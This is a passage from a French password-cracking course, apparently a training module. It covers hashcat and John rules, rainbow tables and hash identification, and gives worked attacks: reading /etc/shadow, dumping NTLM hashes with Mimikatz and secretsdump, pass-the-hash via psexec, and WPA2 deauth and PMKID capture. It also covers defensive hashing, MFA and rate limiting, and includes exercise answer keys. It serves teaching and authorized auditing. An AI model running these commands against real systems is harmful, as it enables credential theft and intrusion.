./kwp basechars/full.base keymaps/fr.keymap routes/2-to-10-max-3-direction-changes.route > keyboard_patterns.txt
hashcat -m 0 -a 0 hashes.txt keyboard_patterns.txt
```

---

## 6. Règles avancées — John et Hashcat

### 6.1 Anatomie d'une règle efficace

Les règles les plus efficaces reflètent les habitudes humaines de construction de mots de passe :

```
Pattern humain         | Règle Hashcat correspondante
-----------------------|------------------------------
Majuscule initiale     | c
Chiffre en fin         | $1 $2 $3 ... $9
Année en fin           | $2$0$2$3  ou  $2$0$2$4
Symbole en fin         | $! $@ $# $. $?
Leet speak simple      | so0 se3 sa@ si!
Doublement             | d  (passwordpassword)
Inversion              | r  (drowssap)
Suppression finale     | ]  (passwor)
Préfixe numérique      | ^1^2^3  (123password)
```

### 6.2 best64 — Analyse des règles

```bash
# Afficher le contenu de best64
cat /usr/share/hashcat/rules/best64.rule

# Les 10 premières règles de best64 :
# :           (aucun changement)
# c           (capitaliser)
# l           (minuscules)
# u           (majuscules)
# r           (inverser)
# d           (dupliquer)
# $1          (ajouter 1)
# $2          (ajouter 2)
# $3          (ajouter 3)
# $!          (ajouter !)
```

### 6.3 Créer des règles Hashcat orientées contexte

```bash
# Règles pour un contexte corporate français
cat << 'EOF' > corporate_fr.rule
# Mots de passe style entreprise française
# Prénom + année
c$2$0$2$4
c$2$0$2$3
c$2$0$2$2
# Prénom + !
c$!
c$1$!
c$1$2$3$!
# Leet speak capitalisé + chiffre
csa@se3so0$1
csa@se3so0$!
# Format type : NomPrenom123
crc$1$2$3
EOF

hashcat -m 0 -a 0 hashes.txt wordlist.txt -r corporate_fr.rule
```

### 6.4 OneRuleToRuleThemAll

```bash
# La règle la plus complète disponible publiquement
# ~52 000 règles, optimisées sur des analyses de fuites réelles
wget https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule

hashcat -m 0 -a 0 hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule
# Attention : très long — peut prendre des heures même avec GPU
```

### 6.5 Règles John — Sintaxe détaillée

```ini
# Dans john.conf ou fichier séparé chargé avec --rules=fichier

[List.Rules:HolbertonRules]
# 1. Mot brut
:
# 2. Capitaliser
c
# 3. Capitaliser + chiffre
c$1
c$2
c$3
c$4
c$5
# 4. Capitaliser + !
c$!
# 5. Majuscules complètes + !
u$!
# 6. Leet speak
so0se3si!sa@
# 7. Leet speak capitalisé
cso0se3si!sa@
# 8. Doublement + majuscule
dc
# 9. Suffixe date courante
$2$0$2$4
c$2$0$2$4
# 10. Format common: Prénom@année
c$@$2$0$2$4
```

---

## 7. Rainbow Tables

### 7.1 Principe mathématique

Une rainbow table résout le compromis temps-mémoire (time-memory tradeoff) : précalculer des hachages pour accélérer la recherche.

```
APPROCHE NAIVE (Table de recherche complète) :
┌──────────────┬────────────────────────────────────────┐
│ Mot de passe │ Hash                                   │
├──────────────┼────────────────────────────────────────┤
│ password     │ 5f4dcc3b5aa765d61d8327deb882cf99       │
│ 123456       │ e10adc3949ba59abbe56e057f20f883e       │
│ letmein      │ 0d107d09f5bbe40cade3de5c71e9e9b7       │
│ ...          │ ...                                    │
└──────────────┴────────────────────────────────────────┘
Problème : 6 milliards de mots de passe × 20 bytes = 120 GB de RAM

RAINBOW TABLE (chaînes de réduction) :
password → H → 5f4d... → R → apple → H → 1f3a... → R → xyz → stocké
                                                               ↑
                                      Seulement les extrémités sont stockées
```

**Fonction de réduction R :** Prend un hash et produit un candidat de mot de passe (pas l'inverse de H — une fonction différente pour chaque position dans la chaîne).

### 7.2 Génération avec RainbowCrack

```bash
# Installation
sudo apt install rainbowcrack

# Générer des tables (NTLM, charset alphanumérique, longueur 1-8)
rtgen ntlm alpha-numeric 1 8 0 3800 33554432 0
rtgen ntlm alpha-numeric 1 8 1 3800 33554432 0
# ... plusieurs partitions nécessaires pour une bonne couverture

# Trier les tables (obligatoire avant utilisation)
rtsort *.rt

# Utiliser les tables
rcrack . -h 32ed87bdb5fdc5e9cba88547376818d4
# Cherche dans les tables du répertoire courant le hash NTLM donné
```

### 7.3 Sources de tables précalculées

```bash
# Tables NTLM gratuites (coverage partielle)
# https://ophcrack.sourceforge.io/tables.php
# xp_free_small (~388 MB, alpha 1-7 chars, ~99% coverage)
# xp_free_fast  (~703 MB, alpha 1-8 chars)

# Ophcrack — outil GUI utilisant ces tables
sudo apt install ophcrack
ophcrack  # Interface graphique

# Pour Windows NTLM local (SAM)
samdump2 /dev/sda1 /keys/bootkey > hashes.txt
ophcrack -t tables/xp_free/ -f hashes.txt
```

### 7.4 Protection par salting

Le sel (salt) est une valeur aléatoire unique ajoutée avant le hachage, stockée en clair avec le hash.

```
SANS SEL (vulnérable) :
hash("password") = 5f4dcc3b...
→ Si deux utilisateurs ont "password", ils ont le même hash
→ Les rainbow tables fonctionnent

AVEC SEL (protégé) :
salt1 = "xKj9Lm"
salt2 = "pQ2rTs"
hash("xKj9Lm" + "password") = a8f1c3d...
hash("pQ2rTs" + "password") = b9e2d4f...
→ Hashes différents pour le même mot de passe
→ Les rainbow tables précalculées sont inutiles
→ L'attaquant doit recalculer pour CHAQUE sel
```

```python
import hashlib
import os

def hash_with_salt(password: str) -> tuple[str, str]:
    """Hachage sécurisé avec sel aléatoire."""
    salt = os.urandom(32).hex()  # 64 chars hex = 256 bits de sel
    hash_value = hashlib.sha256((salt + password).encode()).hexdigest()
    return salt, hash_value

def verify_password(password: str, salt: str, stored_hash: str) -> bool:
    """Vérification d'un mot de passe avec son sel."""
    computed = hashlib.sha256((salt + password).encode()).hexdigest()
    return computed == stored_hash

# Exemple
salt, h = hash_with_salt("MonMotDePasse")
print(f"Sel : {salt}")
print(f"Hash : {h}")
print(verify_password("MonMotDePasse", salt, h))  # True
print(verify_password("AutreMotDePasse", salt, h))  # False
```

> [!tip] Le sel n'a pas besoin d'être secret
> Le sel est stocké en clair à côté du hash dans la base de données. Sa valeur n'est pas un secret — sa **unicité** est ce qui compte. Chaque utilisateur doit avoir un sel différent, idéalement généré cryptographiquement.

---

## 8. Identification de hash

### 8.1 hashid

```bash
# Installation
pip3 install hashid
# ou
sudo apt install hashid

# Identifier un hash
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
# Analyzing '5f4dcc3b5aa765d61d8327deb882cf99'
# [+] MD2
# [+] MD5
# [+] MD4
# [+] Double MD5
# [+] LM
# [+] RIPEMD-128
# [+] Haval-128
# [...]

# Avec les modes Hashcat
hashid -m '5f4dcc3b5aa765d61d8327deb882cf99'
# [+] MD5 [Hashcat Mode: 0]

# Hash Linux shadow
hashid '$6$rounds=656000$salt$hash...'
# [+] SHA-512 Crypt [Hashcat Mode: 1800]

# Hash bcrypt
hashid '$2b$12$...'
# [+] bcrypt [Hashcat Mode: 3200]

# Depuis un fichier
hashid -m -f hashes.txt
```

### 8.2 hash-identifier

```bash
# Installation
sudo apt install hash-identifier

# Utilisation interactive
hash-identifier
# > HASH: 5f4dcc3b5aa765d61d8327deb882cf99
# Possible Hashs:
# [+]  MD5
# [+]  Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

### 8.3 Reconnaissance manuelle des formats

```
Hash                              | Longueur | Format probable
----------------------------------|----------|------------------
5f4dcc3b5aa765d61d8327deb882cf99  | 32 hex   | MD5
aaf4c61ddcc5e8a2dabede0f3b482cd9f | 40 hex   | SHA-1
5e884898da28047151d0e56f8dc6...    | 64 hex   | SHA-256
b109f3bbbc244eb82441917ed06d6...   | 128 hex  | SHA-512
$1$salt$hash                      | variable | MD5crypt (Linux)
$2b$12$salt22chars$hash31chars    | variable | bcrypt
$5$salt$hash                      | variable | SHA-256crypt
$6$salt$hash                      | variable | SHA-512crypt
$y$params$salt$hash               | variable | yescrypt
32 chars hex (Windows)            | 32 hex   | NTLM
```

```bash
# Exemple pratique : reconnaître un hash dans /etc/shadow
sudo cat /etc/shadow | head -5
# root:$6$Wx5k9Lm2$hash...:19000:0:99999:7:::
#      ^^
#      $6$ = SHA-512crypt → hashcat -m 1800
```

### 8.4 Reconnaître NTLM Windows

```bash
# Extraire les hashes NTLM depuis SAM (Windows)
# Nécessite des droits admin ou SYSTEM

# Depuis Mimikatz (Windows)
mimikatz # lsadump::sam

# Depuis impacket (Linux, accès réseau)
impacket-secretsdump Administrator:password@192.168.1.100

# Format d'un hash NTLM dump :
# Utilisateur:UID:LM_Hash:NTLM_Hash:::
# Exemple :
# Administrateur:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
#                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#                    LM Hash (inutile en Win Vista+)    NTLM Hash (intéressant)

# Cracker le NTLM
hashcat -m 1000 -a 0 ntlm_hash.txt rockyou.txt
# ou
hashcat -m 1000 -a 0 32ed87bdb5fdc5e9cba88547376818d4 rockyou.txt
```

---

## 9. Cas pratiques

### 9.1 Cas pratique — /etc/shadow Linux

```bash
# Scénario : accès root temporaire lors d'un audit, extraction des hashes

# Étape 1 : Extraire et préparer
sudo cat /etc/shadow > shadow_backup.txt
sudo cat /etc/passwd > passwd_backup.txt
unshadow passwd_backup.txt shadow_backup.txt > combined.txt

# Étape 2 : Identifier les formats
head -5 shadow_backup.txt
# root:$6$zXb9Kl2m$longhashhereXXX:19500:0:99999:7:::
# ubuntu:$6$OtherSalt$otherhashhereXXX:19500:0:99999:7:::
# www-data:!:19000::::::

# $6$ = SHA-512crypt → mode hashcat 1800

# Étape 3 : Attaque avec Hashcat
hashcat -m 1800 -a 0 combined.txt /usr/share/wordlists/rockyou.txt

# Étape 4 : Si pas de résultat, ajouter des règles
hashcat -m 1800 -a 0 combined.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Étape 5 : Force brute pour les comptes système courts
hashcat -m 1800 -a 3 combined.txt ?l?l?l?l?l?l --increment

# Afficher les résultats
hashcat -m 1800 combined.txt --show

# Avec John
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt combined.txt
john --format=sha512crypt --show combined.txt
```

### 9.2 Cas pratique — Hash NTLM Windows

```bash
# Scénario : pentest d'un domaine Windows, hashes obtenus via
# - Mimikatz lsadump::sam (hashes locaux)
# - Impacket secretsdump (hashes domaine)
# - Capture NetNTLMv2 avec Responder

# Fichier ntlm_hashes.txt :
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
# john.smith:1001:aad3b435b51404eeaad3b435b51404ee:d0f8a8c76dc5e0bc9a0b2f1c3e9d7e04:::

# Extraire uniquement les NTLM (colonne 4)
cut -d: -f4 ntlm_hashes.txt > ntlm_only.txt

# Attaque avec Hashcat
hashcat -m 1000 -a 0 ntlm_only.txt /usr/share/wordlists/rockyou.txt

# Avec règles
hashcat -m 1000 -a 0 ntlm_only.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# NTLM est très rapide (similaire à MD5 pour la vitesse)
# RTX 4090 : ~90 milliards NTLM/seconde
# Force brute de 8 chars en quelques heures

# Pass-the-Hash (si cracking impossible)
# Note : pour les hashes NTLM des admins, le Pass-the-Hash peut être
# plus efficace que le cracking
impacket-psexec -hashes :32ed87bdb5fdc5e9cba88547376818d4 Administrator@192.168.1.100
```

### 9.3 Cas pratique — WPA2 WiFi

```bash
# Étape 1 : Capturer le handshake WPA2 (nécessite d'être sur le réseau)
sudo airmon-ng start wlan0          # Mode monitor
sudo airodump-ng wlan0mon            # Scanner les réseaux
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# Attendre un client ou forcer une déauthentification :
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Vérifier le handshake capturé
aircrack-ng capture-01.cap
# si "1 handshake" → fichier utilisable

# Étape 2 : Convertir pour Hashcat (format 22000)
hcxpcapngtool -o hash.hc22000 capture-01.cap
# ou l'ancienne méthode
hcxtools/cap2hccapx capture-01.cap output.hccapx

# Étape 3 : Cracker avec Hashcat
hashcat -m 22000 -a 0 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Avec règles (très recommandé pour WPA2 — les gens choisissent des mdp humains)
hashcat -m 22000 -a 0 hash.hc22000 rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Hybride wordlist + 4 chiffres (common : NomRéseau2019, NomRéseau1234)
hashcat -m 22000 -a 6 hash.hc22000 wordlist.txt ?d?d?d?d

# PMKID (pas besoin de client connecté, plus moderne)
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 -a 0 pmkid.hc22000 rockyou.txt
```

> [!warning] Légalité WiFi
> Capturer des handshakes sur des réseaux qui ne vous appartiennent pas est illégal. Cette procédure s'applique uniquement à votre propre réseau (audit de sécurité personnel) ou dans le cadre d'un contrat de pentest signé incluant explicitement le périmètre WiFi.

### 9.4 Cas pratique — PDF protégé

```bash
# Extraire le hash d'un PDF protégé
pdf2john.pl document_protege.pdf > pdf_hash.txt
cat pdf_hash.txt
# document_protege.pdf:$pdf$4*4*128*-1028*1*16*...*32*...*32*...

# Identifier le format pour Hashcat
hashid -m pdf_hash.txt
# [+] PDF 1.4 - 1.6 [Hashcat Mode: 10500]

# Cracker avec Hashcat
hashcat -m 10500 -a 0 pdf_hash.txt /usr/share/wordlists/rockyou.txt

# Avec John
john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt
john --show pdf_hash.txt

# Une fois le mot de passe trouvé, déchiffrer le PDF
qpdf --password=MotDePasseTrouve --decrypt document_protege.pdf document_clair.pdf
```

### 9.5 Cas pratique — Archive ZIP

```bash
# Extraire le hash
zip2john archive_protegee.zip > zip_hash.txt
cat zip_hash.txt
# archive_protegee.zip/fichier.txt:$zip2$*...:archive_protegee.zip/fichier.txt:

# Identifier le format
# ZIP classique (ZipCrypto) → mode Hashcat 17200 ou 17210
# ZIP AES-128 → mode Hashcat 13600
# ZIP AES-256 → mode Hashcat 13600

hashcat -m 17200 -a 0 zip_hash.txt /usr/share/wordlists/rockyou.txt

# Avec John
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
john --show zip_hash.txt

# Décompresser avec le mot de passe trouvé
unzip -P "MotDePasseTrouve" archive_protegee.zip
```

### 9.6 Cas pratique — Stratégie d'attaque complète

```bash
# Scénario : base de données de hashes MD5 non salés (fuite classique)
# Objectif : cracker un maximum en minimum de temps

# Phase 1 : Dictionnaire seul (rapide, ~5 minutes)
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Phase 2 : Dictionnaire + best64 (rapide, ~30 minutes)
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Phase 3 : Dictionnaire étendu + règles
hashcat -m 0 -a 0 hashes.txt /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Phase 4 : Hybride wordlist + chiffres
hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d?d?d

# Phase 5 : Hybride chiffres + wordlist
hashcat -m 0 -a 7 hashes.txt ?d?d?d?d rockyou.txt

# Phase 6 : Règles approfondies (lent, plusieurs heures)
hashcat -m 0 -a 0 hashes.txt rockyou.txt \
  -r /usr/share/hashcat/rules/dive.rule

# Phase 7 : Force brute pour les courts (< 7 chars)
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a --increment --increment-min=1

# Résultats cumulatifs (chaque phase repart de là où les précédentes s'arrêtent)
hashcat -m 0 hashes.txt --show | wc -l
```

---

## 10. Contre-mesures

### 10.1 Algorithmes de hachage sécurisés

#### bcrypt — Configuration recommandée

```python
# Python (bibliothèque bcrypt)
import bcrypt

class PasswordManager:
    ROUNDS = 12  # ~250ms sur un serveur moderne (2024)
    # Augmenter à 14 (1s) pour les comptes très sensibles
    
    @staticmethod
    def hash_password(password: str) -> str:
        """Hash un mot de passe avec bcrypt."""
        password_bytes = password.encode('utf-8')
        salt = bcrypt.gensalt(rounds=PasswordManager.ROUNDS)
        return bcrypt.hashpw(password_bytes, salt).decode('utf-8')
    
    @staticmethod
    def verify_password(password: str, hashed: str) -> bool:
        """Vérifie un mot de passe contre son hash bcrypt."""
        password_bytes = password.encode('utf-8')
        hashed_bytes = hashed.encode('utf-8')
        return bcrypt.checkpw(password_bytes, hashed_bytes)

# Usage
pm = PasswordManager()
h = pm.hash_password("MonMotDePasse2024!")
print(h)  # $2b$12$...
print(pm.verify_password("MonMotDePasse2024!", h))   # True
print(pm.verify_password("mauvaismdp", h))           # False
```

#### Argon2id — Configuration recommandée (2024)

```python
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

# Paramètres conformes OWASP 2024
ph = PasswordHasher(
    time_cost=2,        # Minimum OWASP : 2 itérations
    memory_cost=19456,  # 19 MB (OWASP recommande 19 MB minimum pour argon2id)
    parallelism=1,      # 1 thread (augmenter si serveur multi-core puissant)
    hash_len=32,        # 256 bits
    salt_len=16         # 128 bits de sel
)

# Configuration haute sécurité (serveurs puissants)
ph_high = PasswordHasher(
    time_cost=3,
    memory_cost=65536,  # 64 MB
    parallelism=4,
)

def hash_password(password: str) -> str:
    return ph.hash(password)

def verify_password(hash_value: str, password: str) -> bool:
    try:
        ph.verify(hash_value, password)
        return True
    except VerifyMismatchError:
        return False

# Gestion du rehashing (upgrade automatique si les paramètres évoluent)
def login(password: str, stored_hash: str) -> tuple[bool, str | None]:
    """Retourne (succès, nouveau_hash_si_rehashing_nécessaire)."""
    if not verify_password(stored_hash, password):
        return False, None
    
    # Vérifier si le hash doit être mis à jour (paramètres obsolètes)
    if ph.check_needs_rehash(stored_hash):
        new_hash = hash_password(password)
        return True, new_hash
    
    return True, None
```

#### Node.js — bcrypt

```javascript
const bcrypt = require('bcrypt');

const SALT_ROUNDS = 12;

async function hashPassword(password) {
    return await bcrypt.hash(password, SALT_ROUNDS);
}

async function verifyPassword(password, hash) {
    return await bcrypt.compare(password, hash);
}

// Exemple
(async () => {
    const hash = await hashPassword('MonMotDePasse2024!');
    console.log(hash);  // $2b$12$...
    
    const valid = await verifyPassword('MonMotDePasse2024!', hash);
    console.log(valid);  // true
})();
```

### 10.2 Politique de mots de passe

Les recommandations NIST SP 800-63B (2024) ont évolué par rapport aux anciennes pratiques :

```
ANCIENNE APPROCHE (dépassée) :
❌ Expiration obligatoire tous les 90 jours
❌ Règles de complexité strictes (1 majuscule, 1 chiffre, 1 symbole)
❌ Longueur minimale de 8 caractères

NOUVELLE APPROCHE NIST (recommandée) :
✅ Longueur minimale : 8 caractères (viser 12+)
✅ Longueur maximale : 64 caractères minimum supporté
✅ Pas d'expiration forcée (sauf compromission détectée)
✅ Pas de règles de complexité arbitraires
✅ Vérification contre les mots de passe connus compromis (HaveIBeenPwned)
✅ Permettre les espaces et caractères Unicode
✅ Désactiver les indices de mot de passe
```

```python
import requests
import hashlib

def check_password_pwned(password: str) -> int:
    """
    Vérifie si un mot de passe est dans la base HaveIBeenPwned.
    Utilise le modèle k-anonymity (seuls les 5 premiers chars du hash SHA-1 sont envoyés).
    Retourne le nombre de fois que le mot de passe a été trouvé dans des fuites.
    """
    sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]
    
    url = f"https://api.pwnedpasswords.com/range/{prefix}"
    response = requests.get(url)
    
    for line in response.text.splitlines():
        hash_suffix, count = line.split(':')
        if hash_suffix == suffix:
            return int(count)
    return 0

# Exemple
count = check_password_pwned("password")
print(f"Mot de passe trouvé {count} fois")  # Trouvé 9 millions+ de fois
count2 = check_password_pwned("Xr7!mP9@qLk3#nVw")
print(f"Mot de passe fort trouvé {count2} fois")  # 0
```

### 10.3 Authentification multifacteur (MFA)

La MFA rend le cracking de mots de passe largement insuffisant pour un attaquant.

```
SANS MFA :
Attaquant → craque le mot de passe → accès direct

AVEC MFA (TOTP) :
Attaquant → craque le mot de passe → nécessite aussi le code OTP (valide 30s) → bloqué

Types de MFA par ordre de résistance croissante :
1. SMS (vulnérable au SIM swapping) — déprécié par le NIST
2. Email OTP — vulnérable au compromis email
3. TOTP (Google Authenticator, Authy) — résistant au phishing classique
4. HOTP (compteur) — similaire à TOTP
5. FIDO2/WebAuthn (clé physique YubiKey) — résistant au phishing avancé
6. Passkeys (FIDO2 embarqué dans l'appareil) — standard émergent
```

```python
# Implémentation TOTP avec pyotp
import pyotp
import time

# Génération du secret partagé (à stocker chiffré côté serveur)
secret = pyotp.random_base32()
print(f"Secret : {secret}")  # Stocker en base de données

# Générer le QR code pour l'app mobile
totp = pyotp.TOTP(secret)
provisioning_uri = totp.provisioning_uri(
    name="utilisateur@example.com",
    issuer_name="MonApplication"
)
print(f"URL QR : {provisioning_uri}")

# Vérification du code saisi par l'utilisateur
def verify_totp(user_secret: str, user_code: str) -> bool:
    totp = pyotp.TOTP(user_secret)
    # valid_window=1 accepte le code précédent et suivant (fenêtre de 90s)
    return totp.verify(user_code, valid_window=1)
```

### 10.4 Résistance au cracking — Tableau récapitulatif

```
Configuration          | Vitesse GPU (RTX 4090) | Temps pour "Password1!" | Recommandé ?
-----------------------|------------------------|--------------------------|-------------
MD5                    | 164 GH/s               | < 0.001s (dans rockyou)  | JAMAIS
SHA-256                | 18 GH/s                | < 0.001s (dans rockyou)  | Non
SHA-256 + sel 16B      | 18 GH/s                | ~5 minutes (règles)      | Non
bcrypt cost=10         | 500 kH/s               | ~8 heures (rockyou)      | Acceptable
bcrypt cost=12         | 100 kH/s               | ~40 heures (rockyou)     | Oui
bcrypt cost=14         | 25 kH/s                | ~7 jours (rockyou)       | Haute sécurité
Argon2id m=64MB t=3    | ~5 kH/s                | > mois (avec règles)     | Oui (OWASP)
```

> [!tip] Recommandation finale
> Pour tout nouveau projet en 2024 : **Argon2id** avec les paramètres OWASP (m=19456, t=2, p=1) + MFA obligatoire pour les comptes sensibles. Si vous devez utiliser une bibliothèque qui ne supporte pas Argon2id, **bcrypt avec cost=12** est l'alternative acceptable.

### 10.5 Détection d'attaques par force brute

```python
# Exemple de rate limiting et lockout avec Redis
import redis
import time
from functools import wraps

r = redis.Redis(host='localhost', port=6379, db=0)

def rate_limit_login(max_attempts: int = 5, lockout_duration: int = 900):
    """
    Décorateur de rate limiting pour les tentatives de connexion.
    max_attempts : tentatives avant verrouillage
    lockout_duration : durée du verrouillage en secondes (900s = 15 min)
    """
    def decorator(func):
        @wraps(func)
        def wrapper(username: str, password: str):
            key = f"login_attempts:{username}"
            lockout_key = f"lockout:{username}"
            
            # Vérifier si l'utilisateur est verrouillé
            if r.exists(lockout_key):
                ttl = r.ttl(lockout_key)
                raise Exception(f"Compte verrouillé. Réessayez dans {ttl}s.")
            
            # Appeler la fonction de connexion originale
            result = func(username, password)
            
            if result is False:  # Échec de connexion
                # Incrémenter le compteur
                attempts = r.incr(key)
                r.expire(key, 3600)  # Expire après 1h sans activité
                
                if attempts >= max_attempts:
                    r.setex(lockout_key, lockout_duration, 1)
                    r.delete(key)
                    raise Exception(f"Trop de tentatives. Compte verrouillé {lockout_duration}s.")
                
                remaining = max_attempts - attempts
                raise Exception(f"Mot de passe incorrect. {remaining} tentatives restantes.")
            else:
                # Succès — réinitialiser le compteur
                r.delete(key)
                return result
        
        return wrapper
    return decorator

@rate_limit_login(max_attempts=5, lockout_duration=900)
def authenticate(username: str, password: str) -> bool:
    # Logique d'authentification réelle ici
    stored_hash = get_hash_from_db(username)
    return verify_argon2(stored_hash, password)
```

### 10.6 Journalisation et alertes

```python
import logging
import json
from datetime import datetime

# Configurer un logger structuré pour les événements d'authentification
auth_logger = logging.getLogger('auth_events')
auth_logger.setLevel(logging.INFO)

# Handler vers SIEM / fichier
handler = logging.FileHandler('/var/log/auth_events.jsonl')
auth_logger.addHandler(handler)

def log_auth_event(event_type: str, username: str, ip: str, success: bool, details: dict = None):
    """Log structuré pour le SIEM."""
    event = {
        "timestamp": datetime.utcnow().isoformat(),
        "event_type": event_type,  # LOGIN_SUCCESS, LOGIN_FAILURE, ACCOUNT_LOCKED
        "username": username,
        "ip_address": ip,
        "success": success,
        "details": details or {}
    }
    auth_logger.info(json.dumps(event))

# Exemple d'utilisation
log_auth_event("LOGIN_FAILURE", "alice", "192.168.1.100", False, {"attempts": 3})
log_auth_event("ACCOUNT_LOCKED", "alice", "192.168.1.100", False, {"lockout_until": "2024-01-15T10:15:00Z"})
log_auth_event("LOGIN_SUCCESS", "bob", "10.0.0.50", True)
```

---

## 11. Exercices pratiques

### Exercice 1 — Reconnaissance de formats

Identifiez les algorithmes de hachage pour chacun des hashes suivants et donnez le mode Hashcat correspondant :

```
Hash 1 : 5f4dcc3b5aa765d61d8327deb882cf99
Hash 2 : 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
Hash 3 : $6$rounds=656000$hx9Nd8zU$HashLong...
Hash 4 : $2b$12$LQv3c1yqBWVHxkd0LHAkCO...
Hash 5 : 32ed87bdb5fdc5e9cba88547376818d4 (Windows)
Hash 6 : $1$salt$HashCourt...
```

*Réponses :*
```
Hash 1 : MD5 (-m 0)
Hash 2 : SHA-1 (-m 100)
Hash 3 : SHA-512crypt / $6$ (-m 1800)
Hash 4 : bcrypt (-m 3200)
Hash 5 : NTLM (-m 1000)
Hash 6 : MD5crypt / $1$ (-m 500)
```

### Exercice 2 — Commandes Hashcat

Écrivez les commandes Hashcat pour chaque scénario :

1. Cracker un hash MD5 (`482c811da5d5b4bc6d497ffa98491e38`) avec rockyou
2. Attaque hybride sur NTLM : rockyou + 2 chiffres en suffixe
3. Force brute sur un hash SHA-1 pour des PIN à 6 chiffres
4. bcrypt avec best64 (votre fichier s'appelle `bcrypt.txt`)

```bash
# Solution 1
hashcat -m 0 -a 0 482c811da5d5b4bc6d497ffa98491e38 /usr/share/wordlists/rockyou.txt

# Solution 2
hashcat -m 1000 -a 6 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt ?d?d

# Solution 3
hashcat -m 100 -a 3 sha1_hash.txt ?d?d?d?d?d?d

# Solution 4
hashcat -m 3200 -a 0 bcrypt.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

### Exercice 3 — Règles custom

Écrivez un fichier de règles Hashcat qui génère les transformations suivantes pour chaque mot du dictionnaire :

- Mot tel quel
- Première lettre en majuscule
- Première lettre en majuscule + "!" à la fin
- Première lettre en majuscule + "1" à la fin
- Mot en majuscules + "2024" à la fin
- Leet speak (a→@, e→3, i→!, o→0)
- Leet speak capitalisé + "!" à la fin

```bash
# Solution : regles_exercice3.rule
cat << 'EOF' > regles_exercice3.rule
:
c
c$!
c$1
u$2$0$2$4
sa@se3si!so0
csa@se3si!so0$!
EOF

# Test sur un mot
echo "password" | hashcat --stdout -r regles_exercice3.rule
# password
# Password
# Password!
# Password1
# PASSWORD2024
# p@ssw0rd
# P@ssw0rd!
```

### Exercice 4 — Lab complet (CTF-style)

**Setup :** Créez un environnement de test local.

```bash
# Créer des hashes de test
python3 << 'EOF'
import hashlib
import bcrypt

passwords = ["sunshine", "letmein", "dragon", "Batman2024!", "P@ssw0rd"]
print("=== MD5 ===")
for p in passwords:
    print(hashlib.md5(p.encode()).hexdigest())

print("\n=== SHA-256 ===")
for p in passwords:
    print(hashlib.sha256(p.encode()).hexdigest())

print("\n=== bcrypt ===")
for p in passwords:
    h = bcrypt.hashpw(p.encode(), bcrypt.gensalt(rounds=10))
    print(h.decode())
EOF
```

**Challenge :** Cassez ces hashes MD5 :
```
e401c81e696c97cec44e80b45fd0c2e9  (indice : couleur + chiffre)
5d41402abc4b2a76b9719d911017c592  (indice : mot anglais très courant)
96e79218965eb72c92a549dd5a330112  (indice : PIN 6 chiffres)
```

*Correction :*
```bash
# Créer le fichier de hashes
cat << 'EOF' > challenge_hashes.txt
e401c81e696c97cec44e80b45fd0c2e9
5d41402abc4b2a76b9719d911017c592
96e79218965eb72c92a549dd5a330112
EOF

# Attaque dictionnaire
hashcat -m 0 -a 0 challenge_hashes.txt /usr/share/wordlists/rockyou.txt

# Si le premier ne sort pas (indice : couleur + chiffre)
hashcat -m 0 -a 0 challenge_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Pour le PIN 6 chiffres
hashcat -m 0 -a 3 challenge_hashes.txt ?d?d?d?d?d?d

# Afficher les résultats
hashcat -m 0 challenge_hashes.txt --show
# e401c81e696c97cec44e80b45fd0c2e9:blue42
# 5d41402abc4b2a76b9719d911017c592:hello
# 96e79218965eb72c92a549dd5a330112:111111
```

### Exercice 5 — Implémenter le stockage sécurisé

Implémentez en Python un système d'authentification complet avec :
- Argon2id pour le hachage
- Vérification HaveIBeenPwned avant l'enregistrement
- Rate limiting sur 5 tentatives
- Journalisation structurée

```python
#!/usr/bin/env python3
"""
Système d'authentification sécurisé — exercice Holberton
"""
import json
import time
import hashlib
import requests
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError
from collections import defaultdict
from datetime import datetime

# Configuration Argon2id (OWASP 2024)
ph = PasswordHasher(time_cost=2, memory_cost=19456, parallelism=1)

# Base de données simulée (en production : vraie BDD + chiffrement au repos)
users_db = {}

# Rate limiting en mémoire (en production : Redis)
attempt_tracker = defaultdict(list)
MAX_ATTEMPTS = 5
WINDOW_SECONDS = 300  # 5 minutes

def check_pwned(password: str) -> int:
    """Vérifie si le mot de passe est dans HaveIBeenPwned (k-anonymity)."""
    sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]
    try:
